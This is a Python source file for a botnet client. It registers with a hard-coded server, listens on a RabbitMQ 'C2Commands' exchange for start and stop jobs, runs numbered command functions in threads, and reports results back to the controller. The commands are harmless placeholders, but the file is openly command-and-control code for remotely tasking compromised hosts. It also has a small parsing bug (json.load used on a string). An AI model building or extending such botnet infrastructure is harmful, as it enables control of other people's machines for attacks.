import pika
import socket
import time
import threading
import json
import sys


class Client():
    def __init__(self):
        self.bot_registration_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bot_registration_address = ('192.168.0.105', 5582)
        self.commands = {1: self.command1, 2: self.command2}
        self.event_controller = threading.Event()
        self.botnet_id = "0"
        self.bot_id = "0"
        self.c2server_ip = 'localhost'
        self.connection = pika.BlockingConnection(pika.ConnectionParameters(host=self.c2server_ip))


    def register_bot(self):
        try:
            self.bot_registration_socket.connect(self.bot_registration_address)
            response = self.bot_registration_socket.recv(1024).decode()
            response = json.load(response)
            if response['status'] == 'failed':
                raise Exception('Registration failed')
            (self.botnet_id, self.bot_id) = (str(response['botnetId']), str(response['botId']))
        except:
            print("[-] Registration failed")
            sys.exit()


    def listen_for_commands(self):
        queue_name = "c2commands" + self.bot_id
        exchange_name = "C2Commands" + self.botnet_id
        channel = self.connection.channel()
        channel.exchange_declare(exchange=exchange_name, exchange_type='fanout')
        channel.queue_declare(queue=queue_name, exclusive=True)
        channel.queue_bind(exchange=exchange_name, queue=queue_name, routing_key='')
        channel.basic_consume(queue=queue_name, on_message_callback=self.execute_command, auto_ack=True)
        channel.start_consuming()


    def execute_command(self, ch, method, properties, body):
        try:
            body = body.decode()
            job_data = json.loads(body)
            job_action = job_data['jobAction']
            command_id = job_data['commandId']
            command_args = job_data['commandArgs']
        except:
            print("[-] Parsing of job failed")
            return

        if job_action == "stop":
            self.stop_job()
        elif job_action == "start":
            command_function = self.commands[command_id]
            self.event_controller.set()
            thread = threading.Thread(target=command_function, args=(command_args,))
            thread.start()
        else:
            print("[-] Unknown job action")


    def stop_job(self):
        if self.event_controller.is_set():
            self.event_controller.clear()

    
    def command_wrapper(command):
        def command_controller(self, command_args):
            while self.event_controller.is_set():
                (is_done, result) = command(self, command_args)
                if is_done:
                    self.finish_command(result)
        return command_controller


    def finish_command(self, result):
        self.event_controller.clear()
        self.send_result(result)


    def send_result(self, result):
        channel = self.connection.channel()

        body = json.dumps({'botId': self.bot_id, 'result': result})

        channel.queue_declare(queue='command_results')
        channel.basic_publish(exchange='', routing_key='command_results', body=body)
        
        print("[+] Result sent")


    @command_wrapper
    def command1(self, command_args):
        result = "Looped"
        print("Command started")
        for i in range(6):
            print(f"Iteration {i}")
            time.sleep(1)
        print("Command finished")
        return (True, result)

    @command_wrapper
    def command2(self, command_args):
        pass


if __name__ == "__main__":
    client = Client()
    #(client.botnet_id, client.bot_id) = client.register_bot()
    client.botnet_id = "5"
    client.bot_id = "2"
    client.listen_for_commands()